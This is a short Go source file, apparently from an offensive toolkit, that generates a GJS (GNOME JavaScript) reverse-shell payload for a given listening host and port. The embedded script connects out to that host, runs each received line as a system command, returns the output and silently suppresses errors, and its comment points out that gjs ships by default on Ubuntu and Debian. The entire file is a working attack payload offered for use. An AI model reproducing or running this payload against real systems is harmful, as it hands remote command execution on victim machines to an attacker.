package reverse

import (
	"fmt"
)

const GJScriptDefault = `const Gio = imports.gi.Gio;
const GLib = imports.gi.GLib;

try {
	let connection = (new Gio.SocketClient()).connect_to_host("%s:%d", null, null);
	let output = connection.get_output_stream();
	let input = new Gio.DataInputStream({ base_stream: connection.get_input_stream() });

	while (true) {
		let [cmd, size] = input.read_line(null);
		let [res, out, err, status] = GLib.spawn_command_line_sync(imports.byteArray.toString(cmd));
		output.write_bytes(new GLib.Bytes(imports.byteArray.toString(out)), null);
	}
} catch (e) {
}`

// Generates a script that can be used to create a reverse shell via
// gjs (Gnome JS - present on Ubuntu, Debian by default).
func (gjs *GJScriptPayload) Default(lhost string, lport int) string {
	return fmt.Sprintf(GJScriptDefault, lhost, lport)
}
